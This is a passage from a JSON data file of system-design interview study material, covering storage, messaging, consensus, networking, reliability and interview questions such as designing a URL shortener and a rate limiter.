      "id": "6.1",
      "tabTitle": "6.1 Storage Tiers",
      "title": "6.1 Block vs. File vs. Object Storage",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "The three primary storage abstraction layers in computing, their mutation characteristics, and workload profiles.",
      "architecture": "STORAGE CLASSIFICATIONS:\n• Block Storage (SAN / NVMe / EBS): Raw unformatted volume, fixed-size blocks (4KB). Mutated in-place. Single server ownership. Sub-ms latency. Ideal for databases.\n• File Storage (NAS / NFS / EFS): Hierarchical folder tree, POSIX metadata, file + byte ranges. Shared across many servers over network. Millisecond latency.\n• Object Storage (S3 / GCS): Flat bucket namespace, immutable key-blob + custom metadata. REST API (HTTP PUT/GET). Whole-object replacement. Tens of ms latency. Exabyte scale.",
      "tradeoffs": [
        "The Decision Rule: Ask who mutates it and how. In-place microsecond random I/O → Block. Shared POSIX files → File. Immutable media/backups → Object",
        "Common Interview Mistake: Storing image/video blobs inside relational databases (Bloats buffer pool and ruins performance; store blobs in S3 and URI pointer in DB)"
      ],
      "keyTakeaway": "Block = raw & exclusive; File = shared hierarchy; Object = flat, HTTP-addressable immutable blobs. Choose by mutation pattern and sharing model, not by capacity."
    },
    {
      "id": "6.2",
      "tabTitle": "6.2 Why SSDs Fast",
      "title": "6.2 Why SSDs Are Fast",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "Internal hardware mechanics of NAND flash solid-state drives, parallel channels, and the Flash Translation Layer (FTL).",
      "architecture": "PARALLEL ARCHITECTURE:\nHost (PCIe/NVMe) ──► SSD Controller (Flash Controller + RAM cache + FTL mapping)\n                         │\n       ┌────────┬────────┴────────┬────────┐\n       ▼        ▼                 ▼        ▼\n   Channel 0 Channel 1         Channel 2 Channel 3 (Parallel NAND dies)\n• No moving mechanical arm (eliminates 10ms disk seek)\n• Parallel channels allow concurrent page reads/writes across multiple chips\n• FTL out-of-place writes: Flash must be ERASED in large blocks before writing pages!",
      "tradeoffs": [
        "Erase-before-write & Write Amplification: Modifying 4KB requires writing a fresh page; Garbage Collection relocates valid pages, increasing physical writes",
        "Sequential vs. Random I/O on SSD: Sequential access maximizes channel parallelism and minimizes write amplification (Why Kafka & LSM-Trees are flash-friendly!)"
      ],
      "keyTakeaway": "An SSD is fast because it is parallel and has no seek; it is complicated because flash must be erased in blocks. Sequential, append-only writes remain king."
    },
    {
      "id": "6.3",
      "tabTitle": "6.3 Erasure Coding",
      "title": "6.3 Erasure Coding vs. Replication",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "Mathematical durability technique used in modern object storage (S3) that fragments data into chunks with parity blocks for fault tolerance.",
      "architecture": "REED-SOLOMON 4+2 CONFIGURATION:\nObject broken into 4 data chunks: [d1, d2, d3, d4]\nCompute 2 parities: p1 = f(d1..d4), p2 = g(d1..d4)\nSpread 6 chunks across 6 failure domains (different racks/AZs):\n[Node 1: d1] [Node 2: d2] [Node 3: d3] [Node 4: d4] [Node 5: p1] [Node 6: p2]\nIf ANY 2 nodes crash, solve 2 linear equations to achieve 100% exact recovery!",
      "tradeoffs": [
        "Storage Overhead: 4+2 Erasure Coding requires 50% extra space vs. 3-way replication which requires 200% overhead (Huge cost savings!)",
        "Durability: Backblaze calculation shows Erasure Coding achieves ~11 nines durability vs. ~6 nines for 3× replication",
        "The Penalty: Degraded read during failure requires fetching k chunks and decoding on CPU + network; bad for small objects (<1MB)"
      ],
      "keyTakeaway": "Erasure coding buys more durability for a quarter of replication's storage overhead, and pays for it in read complexity and repair cost. Quote: '50% vs 200% overhead, 11 nines vs 6.'"
    }
  ],
  "16": [
    {
      "id": "7.1",
      "tabTitle": "7.1 Delivery Semantics",
      "title": "7.1 Delivery Semantics: At-Most, At-Least, Exactly Once",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Message delivery contract guarantees across distributed queues and stream processors, and how to achieve exactly-once processing.",
      "architecture": "WHERE GUARANTEES COME FROM (ACK TIMING):\n• At-Most Once: ACK sent BEFORE processing → Worker crashes → Message LOST.\n• At-Least Once: ACK sent AFTER processing → Worker crashes before ACK → Message REDELIVERED (Duplicates possible!).\n• Exactly-Once Effect = At-Least Once delivery + Idempotent consumer (dedupe table or transactional offset commit).",
      "tradeoffs": [
        "The Two Generals Impossibility: Exactly-once DELIVERY across an unreliable network is theoretically impossible; exactly-once PROCESSING is achievable via idempotency",
        "Idempotent Consumer SQL: Insert `(event_id)` into `processed_events` table within same local DB transaction that executes business update (`ON CONFLICT DO NOTHING`)",
        "Message Queues (RabbitMQ/SQS: task dispatch with competing consumers, per-message delete) vs. Streaming Logs (Kafka: append-only, replayable, multiple consumers)"
      ],
      "keyTakeaway": "Ack timing determines the guarantee. Default to at-least-once and put the burden on an idempotent consumer. Say: 'Exactly-once is achievable as an effect, not as a delivery.'"
    },
    {
      "id": "7.2",
      "tabTitle": "7.2 Why Kafka Fast",
      "title": "7.2 Why Kafka Is Fast",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "The architectural principles that allow Apache Kafka to achieve millions of messages per second with sub-millisecond latency on commodity hardware.",
      "architecture": "ZERO-COPY DATA PATH (sendfile):\nDisk ──► OS Page Cache ──sendfile() syscall──► Network Card (NIC) ──► Consumer\nEliminates copying through user-space memory and avoids 4 context switches!\nSequential Append-Only Log: Disk sequential throughput matches RAM speeds (~600 MB/s); OS readahead prefetches pages into kernel buffer.",
      "tradeoffs": [
        "OS Page Cache IS the Cache: Kafka keeps no in-process JVM message cache, eliminating GC pauses; broker restarts do not lose the warm cache",
        "Batching & Compression: Producers batch messages (`linger.ms`); broker transmits compressed batches without decompression",
        "When Zero-Copy Breaks: Enabling TLS encryption forces Kafka to copy bytes into user space for CPU encryption, raising CPU load"
      ],
      "keyTakeaway": "Kafka is fast because it only appends (sequential I/O), never copies through user space (zero copy), batches aggressively, and lets the OS page cache do the caching."
    },
    {
      "id": "7.4",
      "tabTitle": "7.4 2PC vs. Saga",
      "title": "7.4 Distributed Transactions: 2PC vs. Saga",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Techniques for maintaining consistency across independent microservices and databases without a single shared transaction coordinator.",
      "architecture": "2PC VS SAGA:\n• 2-Phase Commit (2PC): Phase 1 Prepare → Phase 2 Commit. Synchronous blocking locks held across network hops; coordinator crash leaves participants blocked ('in doubt').\n• Saga Pattern: Sequence of local transactions where each step commits immediately. If Step 3 fails, compensating transactions run in reverse (Refund payment, Cancel reservation).\n• Transactional Outbox: Write business entity + event to local DB transaction, then relay to Kafka at-least-once.",
      "tradeoffs": [
        "Atomicity vs. Availability (2PC gives ACID atomicity but destroys availability across microservices; Sagas give eventual consistency with high availability)",
        "Intermediate States in Sagas (Intermediate states are visible to users; require semantic locks: e.g. marking order as `PENDING`)",
        "Irreversible Steps (Sending an email or charging a card cannot be rolled back; order saga steps so irreversible actions happen LAST)"
      ],
      "keyTakeaway": "2PC buys atomicity with availability; sagas buy availability with isolation. Across microservices, choose sagas: orchestrated, idempotent, with a transactional outbox."
    },
    {
      "id": "6.4",
      "tabTitle": "6.4 Event-Driven",
      "title": "6.4 Event-Driven Architecture",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Decoupled asynchronous state changes, event streams, choreography vs. orchestration, and CQRS/Event Sourcing.",
      "architecture": "EVENT SOURCING & CQRS:\nCommand → Write Model (Append-Only Event Store) → CDC/Kafka Stream → Projections → Read Model (Materialized Views in Elasticsearch/PostgreSQL/Redis).\n• Event Immutability: Past facts cannot be edited.\n• Dual-Write Solution: Transactional Outbox Pattern.\n• GDPR Compliance: Crypto-Shredding per-user encryption keys.",
      "tradeoffs": [
        "Choreography vs. Orchestration: Choreography has no single coordinator but risks event spaghetti; Orchestration (Temporal) provides centralized state and timeouts",
        "Thin vs. Fat Events: Event Notification requires synchronous RPC callbacks; Event-Carried State Transfer provides full autonomy but larger messages",
        "CQRS Eventual Consistency: Read model projection lag requires optimistic UI updates or sticky version tokens"
      ],
      "keyTakeaway": "Event-driven architecture provides temporal and spatial decoupling, but shifts complexity to eventual consistency, schema evolution, and distributed observability. Use the Transactional Outbox Pattern and Schema Registry."
    }
  ],
  "17": [
    {
      "id": "10.1",
      "tabTitle": "10.1 Consensus & Raft",
      "title": "10.1 Consensus and Coordination (Raft)",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Protocols allowing a cluster of independent nodes to agree on a single sequence of state machine transitions despite network delays and machine crashes.",
      "architecture": "RAFT CONSENSUS LIFECYCLE:\nFollower ──(election timeout 150-300ms)──► Candidate ──votes──► Leader (Term N+1)\nClient ──Write──► Leader ──replicates──► Follower 1 & 2\nOnce replicated to MAJORITY (Quorum = floor(N/2)+1) → Entry Committed → Applied to State Machine → ACK Client.\nFencing Tokens: Monotonically increasing numbers sent with leases so storage can reject stale zombie leaders!",
      "tradeoffs": [
        "Quorum Arithmetic: 3 nodes tolerate 1 failure (quorum=2); 4 nodes tolerate 1 failure (quorum=3; slower writes for zero gain!); Always use ODD cluster sizes (3, 5)",
        "Split-Brain Prevention: A minority partition cannot achieve quorum votes, preventing split-brain write corruption",
        "Coordination Stores (etcd, ZooKeeper): Coordination stores hold megabytes, not gigabytes! Storing application data in etcd starves the control plane"
      ],
      "keyTakeaway": "Consensus buys one unambiguous decision-maker at the cost of a quorum round trip. Use odd cluster sizes, spread members across AZs, and remember locks require fencing tokens."
    },
    {
      "id": "10.2",
      "tabTitle": "10.2 Distributed Time",
      "title": "10.2 Distributed Time and Ordering",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Mechanisms for determining causality and order of events in distributed environments where physical wall-clocks drift and cannot be trusted.",
      "architecture": "ORDERING MECHANISMS COMPARISON:\n• Wall-Clock (NTP): Clocks drift, leap seconds, VM pauses. Last-Write-Wins (LWW) silently discards newer writes!\n• Lamport Timestamps: Counter per node; guarantees total ordering but cannot detect whether two events are concurrent\n• Vector Clocks: Vector of counters per node; detects true concurrency: {A:1, B:0} vs {A:0, B:1} are incomparable → concurrent siblings surfaced for application merge\n• TrueTime (Google Spanner): GPS + Atomic clocks in datacenters expose bounded uncertainty interval [earliest, latest]; commit-wait guarantees external consistency.",
      "tradeoffs": [
        "Never order events or expire leases using unsynchronized wall-clock timestamps",
        "Vector Clock Overhead: Metadata grows with number of writers; requires pruning and application domain merge functions"
      ],
      "keyTakeaway": "Wall-clock time is not an ordering mechanism. Prefer designs that need no global order (commutative operations). When order is required, name the mechanism and its cost."
    },
    {
      "id": "10.4",
      "tabTitle": "10.4 Failure Detection",
      "title": "10.4 Failure Detection & Grey Failures",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Algorithms used by clusters to detect dead nodes, trigger leader elections, and handle partial degraded node failures.",
      "architecture": "DETECTION MECHANISMS:\n• Fixed Heartbeat: Miss $k$ heartbeats → declare dead (Simple, but vulnerable to GC pauses)\n• Phi-Accrual (Cassandra/Akka): Models historical heartbeat arrival distribution; outputs suspicion level $\\phi$ rather than binary dead/alive\n• SWIM Gossip (Consul/HashiCorp): Random peer probes; if no reply, asks other nodes to probe indirectly before declaring dead (filters out single bad links, scales to thousands of nodes)",
      "tradeoffs": [
        "The Impossibility Result: On an asynchronous network, you cannot distinguish a crashed node from a slow node or a partition. Every detector is a guess with a bias",
        "Grey Failure: The hardest real-world bug. Node is not dead, but sick (answers health check 200 OK while serving 40% errors). Requires outlier ejection comparing peer error rates",
        "Correlated False Positives: Fleet-wide GC or network switch blip makes 50% of nodes look dead; automated recovery must have a circuit breaker to prevent mass eviction"
      ],
      "keyTakeaway": "You cannot tell dead from slow: pick which mistake you can afford. Aggressive detection needs fencing; patient detection costs availability. Use outlier ejection for sick nodes."
    }
  ],
  "18": [
    {
      "id": "11.3",
      "tabTitle": "11.3 Service Mesh",
      "title": "11.3 Service Mesh and the Sidecar Model",
      "section": "Part 11 · Networking",
      "whatItIs": "Dedicated infrastructure layer consisting of sidecar proxies (Envoy) deployed alongside microservices to handle service-to-service communication.",
      "architecture": "DATA PLANE & CONTROL PLANE:\nControl Plane (Istio) ──pushes certificates & routing rules──►\n  [Service A + Envoy Sidecar] ◄──mTLS encrypted──► [Service B + Envoy Sidecar]\nApp code communicates over localhost; Sidecar handles mTLS, retries, timeouts, telemetry, and circuit breaking!",
      "tradeoffs": [
        "Adopt a Mesh When: Polyglot microservices in multiple languages; strict corporate mTLS requirements; dynamic canary traffic shifting",
        "Avoid a Mesh When: Small monolithic team; sub-millisecond latency budgets (Sidecar adds ~1ms per hop, doubled because both ends proxy!)",
        "Resource Cost: 1 sidecar per pod consumes hundreds of MBs RAM and CPU; at 5,000 pods this represents significant cluster overhead"
      ],
      "keyTakeaway": "A service mesh moves transport concerns out of application code into a uniform layer. North-south traffic belongs at the API Gateway; east-west belongs in the Mesh."
    },
    {
      "id": "11.4",
      "tabTitle": "11.4 Anycast & BGP",
      "title": "11.4 Global Traffic Management: Anycast, BGP and GSLB",
      "section": "Part 11 · Networking",
      "whatItIs": "Mechanisms for routing global client traffic to the closest geographical Point of Presence (PoP) or datacenter.",
      "architecture": "ANYCAST ROUTING FLOW:\nSame IP address (e.g. 1.1.1.1) announced via BGP from 200+ PoPs worldwide.\n• User in Tokyo → Internet BGP routes to Tokyo PoP (lowest AS hops)\n• User in London → Internet BGP routes to London PoP\n• PoP Failure: Stop announcing BGP prefix from London → Routers immediately reconverge in seconds to Frankfurt. Zero DNS TTL wait!",
      "tradeoffs": [
        "Anycast + BGP (Sub-second failover, no client cooperation, but routes by AS hops not latency; long-lived TCP connection resets if route flaps)",
        "DNS-based GSLB (Works everywhere, supports geo-pinning and weights, but failover takes minutes due to resolver TTL caching)",
        "The Practical Combination: Anycast for edge CDN/DNS; DNS GSLB for steering between regional backend clusters"
      ],
      "keyTakeaway": "DNS steers in minutes; anycast steers in seconds. Use DNS for policy and anycast for fast edge evacuation. Moving traffic is easy; moving the stateful write path is hard."
    },
    {
      "id": "11.5",
      "tabTitle": "11.5 Long-Lived Conn",
      "title": "11.5 Scaling Long-Lived Connections",
      "section": "Part 11 · Networking",
      "whatItIs": "Web applications designed to maintain persistent network connections for seconds to hours (WebSocket, SSE, gRPC streaming, TCP) rather than single-request HTTP.",
      "architecture": "THE C10M CONNECTION ARCHITECTURE:\n1M Sockets ──► Layer 4 LB (Maglev/NLB) ──► Connection Gateway Tier (epoll/kqueue) ──► Pub/Sub Backplane (Redis/Kafka) ──► Stateless Application Workers.\nKernel Tunings: fs.file-max (2M), tcp_rmem/tcp_wmem (min 4KB), somaxconn (65535).\nReconnection Storm: Exponential backoff with full jitter to avoid crushing servers after restart.",
      "tradeoffs": [
        "WebSocket (Full duplex, binary framing, manual reconnect) vs SSE (HTTP/2 streaming, native auto-reconnect, text stream)",
        "Decouple stateful connection proxies from stateless business logic; never run business code in the socket process",
        "Tuning socket buffers down to 4KB shrinks 1M idle socket RAM from 128GB to ~14GB"
      ],
      "keyTakeaway": "Scaling long-lived connections is an OS and architecture problem, not a code problem. Use non-blocking event loops (epoll), tune socket memory buffers down to 4KB, isolate connections in a dedicated gateway tier, and route messages across a pub/sub backplane. Always protect reconnects with exponential backoff and full jitter."
    },
    {
      "id": "11.6",
      "tabTitle": "11.6 WebRTC Media",
      "title": "11.6 WebRTC and Real-Time Media",
      "section": "Part 11 · Networking",
      "whatItIs": "Browser-native framework for real-time audio, video, and data communication with sub-150ms latency.",
      "architecture": "MEDIA TOPOLOGIES:\n• Mesh (P2P): Each peer sends stream to every other peer. (Zero server media cost, but uplink dies at ~4 participants)\n• SFU (Selective Forwarding Unit): Peers send 1 upstream; SFU selectively forwards streams down to participants without transcoding (The Industry Standard for Zoom/Meet)\n• MCU (Multipoint Control Unit): Server decodes, composites, and re-encodes single mixed stream (CPU intensive)\n• NAT Traversal: STUN (discovers public IP) + TURN (relay server when direct UDP blocked; 10–20% of traffic)",
      "tradeoffs": [
        "Simulcast: Sender publishes 3 resolutions (1080p, 720p, 360p); SFU forwards appropriate quality based on each receiver's downlink",
        "WebRTC vs. HLS/DASH (WebRTC sub-150ms latency for bidirectional conversation; HLS for one-to-many broadcast caching over CDNs)"
      ],
      "keyTakeaway": "WebRTC provides encrypted media and NAT traversal but leaves signaling to you. Topology: Mesh for 1:1, SFU with simulcast for group video calls, HLS for mass broadcast."
    }
  ],
  "19": [
    {
      "id": "8.1",
      "tabTitle": "8.1 Deploy Patterns",
      "title": "8.1 Deployment Strategies & Zero Downtime",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "Techniques for releasing new software versions to production while minimizing risk, blast radius, and customer downtime.",
      "architecture": "DEPLOYMENT SPECTRUM:\n• Rolling: Gradually replaces instances (V1 V1 → V2 V1 → V2 V2). No extra infra cost; V1 and V2 coexist.\n• Blue/Green: Two identical environments. Load balancer flips traffic 100% Blue → Green. Instant rollback; 2× infra cost.\n• Canary: Routes 5% traffic to V2 canary nodes → monitors metrics → ramps to 100%. Smallest blast radius.\n• Shadow (Dark Launch): Clones production traffic to V2; discards V2 response. Validates performance without user impact.",
      "tradeoffs": [
        "Database Schema Migrations (The Expand-Contract Pattern: 1. Add nullable column; 2. Deploy app writing to both; 3. Backfill; 4. Switch reads; 5. Drop old column)",
        "Decoupling Deploy from Release: Deploy code behind feature flags so rollbacks are instantaneous config flips (seconds) rather than redeploys (minutes)"
      ],
      "keyTakeaway": "Always connect deployment strategy choice to: Traffic → Risk → Monitoring → Rollback → Database Compatibility. Never drop columns in a single step."
    },
    {
      "id": "8.2",
      "tabTitle": "8.2 Resilience Patterns",
      "title": "8.2 Resilience: Timeouts, Retries, Circuit Breakers, Backpressure",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "Defensive mechanisms that prevent transient failures from escalating into catastrophic cascading system collapse.",
      "architecture": "CASCADING COLLAPSE & THE CIRCUIT BREAKER:\nService B slows → Service A threads block → Clients timeout and retry → Traffic triples → B collapses → System OOM!\nCIRCUIT BREAKER STATE MACHINE:\n[CLOSED: Healthy] ──failure rate > 50%──► [OPEN: Fail Fast immediately]\n                                              │\n                                         cool-down 30s\n                                              ▼\n                                        [HALF-OPEN: Probe trial calls] ──success──► CLOSED",
      "tradeoffs": [
        "Exponential Backoff with JITTER: Jitter is mandatory! Without randomized jitter, retrying clients synchronize into thundering herds",
        "Retry Budget: Cap retries as a fraction of total traffic (e.g. max 10%) so retries cannot amplify load on a struggling downstream dependency",
        "Degrade, Don't Fail: Serve stale cache, omit recommendation widgets, or queue writes rather than returning a 500 error"
      ],
      "keyTakeaway": "Every remote call needs a timeout, a bounded retry with jitter, a breaker, and a defined degraded mode. Cascading failures are almost always caused by retries amplifying load."
    },
    {
      "id": "8.3",
      "tabTitle": "8.3 Linux Triage",
      "title": "8.3 Diagnosing a Runaway Process on Linux",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "A methodical 4-step triage sequence for diagnosing mysterious production performance degradation on Linux hosts.",
      "architecture": "REPEATABLE TRIAGE ORDER:\n1. SATURATION: `uptime`, `vmstat 1` (Check load average vs. core count; run queue `r`)\n2. WHICH RESOURCE:\n   • CPU: `top`, `pidstat -u` (User vs. System vs. iowait)\n   • Memory: `free -m`, `vmstat` (Swap si/so > 0? OOM killer in dmesg?)\n   • Disk: `iostat -xz 1` (%util near 100%? await climbing?)\n   • Network: `ss -s` (Socket states, TIME_WAIT accumulation)\n3. WHICH PROCESS: `pidstat 1`, `top -H` (Per-thread CPU)\n4. WHAT IS IT DOING: `strace -p PID`, `perf top`, `jstack`/`py-spy` thread dumps, `lsof -p PID`",
      "tradeoffs": [
        "Load Average Trap: Load average includes tasks in uninterruptible sleep (I/O wait or stuck NFS mount) without consuming CPU",
        "Containers & Cgroups: `top` inside a container shows host memory; check cgroup limits in `/sys/fs/cgroup` to see why OOM-killer fired"
      ],
      "keyTakeaway": "Have a triage order, not a tool list: saturation → which resource → which process → which syscall or stack trace."
    }
  ],
  "20": [
    {
      "id": "12.3",
      "tabTitle": "12.3 SLIs & SLOs",
      "title": "12.3 SLIs, SLOs and Error Budgets",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Quantifiable engineering standards for measuring user experience and establishing an error budget policy between velocity and reliability.",
      "architecture": "FORMULATIONS:\n• SLI (Indicator): Proportion over threshold, e.g., (Valid requests under 200ms) / (Total valid requests)\n• SLO (Objective): Target goal, e.g., 99.9% availability over rolling 28 days\n• Error Budget: 100% - 99.9% = 0.1% allowed failures (~40 mins downtime/month)\n• Burn-Rate Alerting: Alert based on how fast error budget is consumed:\n  1× burn rate = budget lasts 28 days | 14.4× burn rate = budget gone in 2 days (PAGE)",
      "tradeoffs": [
        "Never Write an SLO on an Average (Average latency hides the p99 tail where 5% of users wait 4 seconds; use percentiles)",
        "Measuring Where the User Is: Measuring server-side only excludes DNS, TLS, and network delays felt by clients",
        "Error Budget Policy: Budget remaining means you can ship faster; budget exhausted halts feature releases for reliability sprints"
      ],
      "keyTakeaway": "Express an SLO as a proportion over a threshold across a rolling window, measured where the user is. The error budget turns reliability into a spendable currency."
    },
    {
      "id": "12.4",
      "tabTitle": "12.4 Multi-Region DR",
      "title": "12.4 Multi-Region Architecture and Disaster Recovery",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Designing multi-datacenter topologies capable of surviving the total loss of an entire cloud region without permanent data loss.",
      "architecture": "ACTIVE-ACTIVE READS, SINGLE WRITE REGION:\nEU User ──5ms──► EU Replica (local read) | US User ──5ms──► US Primary (local read)\nEU User ──90ms write──► US Write Region ──async replication──► EU Replica (lags 50-200ms)\nReads are instant worldwide; single write authority eliminates multi-master conflict resolution!\nRead-your-own-writes handled by reading from primary for 5s after user mutates state.",
      "tradeoffs": [
        "Four DR Patterns: 1. Backup & Restore (Hours/days, cheap); 2. Pilot Light (Minutes); 3. Active-Passive (Seconds RTO); 4. Full Active-Active (Instant, massive complexity)",
        "Data Problem in Regional Failover: Moving traffic takes seconds with Anycast; moving the database write path requires quorum promotion, fencing, and accepting RPO data loss",
        "Split-Brain Danger: Two regions both promoting themselves as write leader corrupts data; require 3-region quorum or human break-glass confirmation"
      ],
      "keyTakeaway": "State the DR pattern with its RPO, RTO, and cost. Default to local reads with a single write region; reserve full active-active for data that can be merged safely."
    },
    {
      "id": "12.7",
      "tabTitle": "12.7 Chaos Engineering",
      "title": "12.7 Chaos Engineering and Game Days",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "The discipline of experimenting on a distributed system to build confidence in its capability to withstand turbulent production conditions.",
      "architecture": "THE 6-STEP EXPERIMENT METHOD:\n1. Steady State: Define metric meaning 'healthy' (e.g. checkout success rate ≥ 99.5%, p99 ≤ 400ms)\n2. Hypothesis: 'If 1 payment node dies, checkout success stays ≥ 99.5% because LB ejects it within 10s'\n3. Blast Radius: Smallest injection testing hypothesis; define abort condition BEFORE starting\n4. Inject Failure: One variable only, during business hours with team observing\n5. Observe: Did steady state hold? If not, defect discovered for free!\n6. Fix & Automate: Remediate architecture and convert into automated regression test.",
      "tradeoffs": [
        "Chaos vs. Testing: Testing verifies code against specifications; Chaos verifies that complex system configurations and fallbacks hold in practice",
        "Highest-Yield First Experiments: Killing the caching cluster and simulating regional network blackholes (The two failures designs assume away)"
      ],
      "keyTakeaway": "Chaos engineering is a hypothesis-driven experiment with a defined blast radius and abort switch, not randomly breaking production. Untested recovery paths do not work."
    }
  ],
  "21": [
    {
      "id": "rev-3",
      "tabTitle": "Drills & Recall",
      "title": "Revision Day 3 · Distributed Consensus, Kafka & Multi-Region",
      "section": "Week 3 Review & Active Recall",
      "whatItIs": "Consolidation drills on Week 3 systems concepts: Raft consensus, zero-copy Kafka mechanics, service mesh tradeoffs, and multi-region disaster recovery.",
      "architecture": "WEEK 3 RAPID AUDIT:\n✓ Raft leader election and log replication invariants\n✓ Lamport timestamps vs. Vector clocks concurrency detection\n✓ Zero-copy sendfile syscall vs. user-space socket buffers\n✓ 2PC blocking coordination vs. Saga compensating workflows\n✓ Service mesh sidecar latency overhead vs. mTLS benefits\n✓ Multi-region RPO/RTO trade-offs and Anycast failover",
      "tradeoffs": [
        "Whiteboard Drill: Walking through a 3-datacenter Raft cluster partition scenario step-by-step",
        "Architecture Drill: Designing an active-active read / single-write-region database replication flow"
      ],
      "keyTakeaway": "Staff engineers excel at distributed failure scenarios: explaining what happens when leaders crash, partitions isolate quorums, or clocks drift."
    },
    {
      "id": "rev-3-checklist",
      "tabTitle": "Week 3 Checklist",
      "title": "Week 3 Core Mastery Checklist",
      "section": "Week 3 Review & Active Recall",
      "whatItIs": "Self-assessment checklist to verify mastery over advanced distributed systems, storage, and networking.",
      "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you state the formula for Raft quorum and explain why even node counts hurt?\n[ ] Can you diagram how sendfile() transfers disk blocks to the network socket?\n[ ] Can you design a transactional outbox table and explain what bug it fixes?\n[ ] Can you explain how BGP Anycast achieves sub-second failover without DNS caching delays?\n[ ] Can you explain the difference between SLI, SLO, SLA, and error budget burn rates?",
      "tradeoffs": [
        "Theory vs. Practical engineering: Always quote numbers (e.g. 1ms sidecar overhead, 150ms cross-continent WAN RTT)",
        "Sagas vs 2PC: Defend Sagas when services cross administrative or database boundaries"
      ],
      "keyTakeaway": "Consensus and coordination are the backbone of distributed infrastructure. Fluency here is what unlocks staff-level interview evaluations."
    }
  ],
  "22": [
    {
      "id": "mc-framework",
      "tabTitle": "Framework",
      "title": "Part I — The System Design Interview Framework",
      "section": "Masterclass · Part I",
      "whatItIs": "The 7-step repeatable process, standard answer template, what to write vs. explain verbally, and 45-minute interview budget.",
      "tradeoffs": [
        "Drawing boxes immediately vs. Pinning down problem boundaries and numbers first",
        "Documenting every detail vs. Writing high-level anchors on the board and explaining nuances verbally"
      ],
      "keyTakeaway": "Strong candidates do not start by drawing boxes. They first nail down the problem and the constraints that will drive the architecture."
    },
    {
      "id": "mc-q1",
      "tabTitle": "Q1: URL Shortener",
      "title": "Question 1. Design a URL Shortener like Bitly",
      "section": "Module 1 · Core System Design",
      "whatItIs": "Ingest long URLs and emit short URLs; quick redirects, Base62 codes, high read traffic, and dependable key-value storage.",
      "tradeoffs": [
        "Base62 encoded IDs (compact, fast decode) vs. Random codes (collision retry loop)",
        "HTTP 302 Found (full click telemetry) vs. HTTP 301 Moved Permanently (browser cached)"
      ],
      "keyTakeaway": "Favor read-heavy throughput, cache hot mappings with Redis, and use 302 redirects for click measurement."
    }
  ],
  "23": [
    {
      "id": "mc-q2",
      "tabTitle": "Q2: Rate Limiter",
      "title": "Question 2. Design a Distributed Rate Limiter",
      "section": "Module 1 · Core System Design",
      "whatItIs": "Limit request rates per user, API key, IP, or endpoint using Token Bucket with atomic Redis Lua scripts.",
      "tradeoffs": [
        "Global Redis state (tighter consistency) vs. In-memory limits (faster, but vanishes on restart)",
        "Fail open (keeps API up, risk flooding) vs. Fail closed (shields services, risk denying callers)"
      ],
      "keyTakeaway": "Token bucket at gateway with atomic Redis Lua script; fail-open with conservative local limits during dependency outage."
    }
  ],
  "24": [
    {
      "id": "mc-q3",
      "tabTitle": "Q3: Notifications",
      "title": "Question 3. Design a Notification System",
      "section": "Module 1 · Core System Design",
      "whatItIs": "Deliver user notifications via push, SMS, or email; respect priority, preferences, provider outages, and delivery state.",
      "tradeoffs": [
        "Asynchronous delivery (adds resilience, but introduces slight latency)",
        "Priority queues (protect critical transactional alerts, require capacity planning)"
      ],
      "keyTakeaway": "Separate transactional and bulk marketing queues; use stable idempotency keys and transactional outbox to prevent duplicates."
    }
  ],
  "25": [
    {
      "id": "mc-q4",
      "tabTitle": "Q4: Distributed Cache",
      "title": "Question 4. Design a Distributed Cache",
      "section": "Module 1 · Core System Design",
      "whatItIs": "Distributed key-value cache across nodes with consistent hashing, LRU/LFU eviction policies, TTL expiration, and stampede protection.",
      "tradeoffs": [
        "Cache-aside pattern (straightforward, but exposed to stampedes)",
        "Write-through caching (improves freshness, but increases write latency)"
      ],
      "keyTakeaway": "Consistent hashing for key partitioning; protect databases from thundering herds using singleflight request coalescing and TTL jitter."
    }
  ],
  "26": [
    {
      "id": "mc-q5",
      "tabTitle": "Q5: API Gateway",
      "title": "Question 5. Design an API Gateway",
      "section": "Module 1 · Core System Design",
      "whatItIs": "Single external-facing entry point for backend access handling TLS termination, token auth, rate limiting, and route resolution.",
      "tradeoffs": [
        "Shared policy enforcement (uniformity, but adds hop latency)",
        "Embedding business logic in gateway (simplifies clients, but couples routing to domain)"
      ],
      "keyTakeaway": "Keep domain business logic out of the gateway; let the gateway enforce authentication, rate limits, and coarse-grained routing."
    }
  ],
  "27": [
    {
      "id": "mc-q6",
      "tabTitle": "Q6: Instagram",
      "title": "Question 6. Design Instagram",
      "section": "Module 2 · Consumer-Scale Applications",
      "whatItIs": "Photo-sharing service with presigned direct object storage uploads, asynchronous variants processing, and hybrid fan-out feeds.",
      "tradeoffs": [
        "Push fan-out at write time (snappy feed reads, but high cost at celebrity scale)",
        "Pull fan-out at read time (reduced write amplification, heavier work at read time)",
        "Hybrid approach (push for normal users, pull for celebrities merged at read time)"
      ],
      "keyTakeaway": "Upload media directly to object storage with presigned URLs; use hybrid fan-out to balance write amplification against feed read latency."
    }
  ],
  "28": [
    {
      "id": "mc-q7",
      "tabTitle": "Q7: WhatsApp",
      "title": "Question 7. Design WhatsApp",
      "section": "Module 2 · Consumer-Scale Applications",
      "whatItIs": "Real-time messaging system with persistent WebSocket connections, offline message queuing, delivery receipts, and end-to-end encryption.",
      "tradeoffs": [
        "Persistent connections (cut per-message overhead, demand careful resource management)",
        "End-to-end encryption (strengthens privacy, prevents server-side search and moderation)"
      ],
      "keyTakeaway": "Manage persistent connections with connection gateways; partition ordering per conversation; never decrypt message bodies on the server."
    }
  ],
  "29": [
